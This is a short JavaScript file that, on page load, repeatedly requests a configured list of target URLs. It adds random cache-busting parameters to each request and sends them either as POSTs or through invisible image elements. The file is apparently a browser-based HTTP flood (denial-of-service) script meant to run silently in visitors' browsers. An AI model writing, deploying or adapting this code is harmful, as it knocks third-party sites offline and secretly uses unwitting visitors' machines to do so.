window.onload = function () {
	for (var i = 0; i < ccData.url.length; i++) {
		var urlObj = new URL(ccData.url[i]);
		for (var j = 0; j < ccData.count; j++) {
			var url = urlObj.origin + urlObj.pathname + '?cc=' + btoa(Math.random()).replace(/[=\+]/g, '');
			urlObj.searchParams.forEach(function (v, k) {
				url += '&' + k + '=' + v;
			})
			if (ccData.method == "POST") {
				var httpRequest = new XMLHttpRequest();
				httpRequest.open('POST', url);
				httpRequest.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
				httpRequest.send(ccData.data);
			} else {
				var img = document.createElement("img");
				img.src = url;
				img.style.display = 'none';
				document.body.append(img);
			}
		}
	}
};
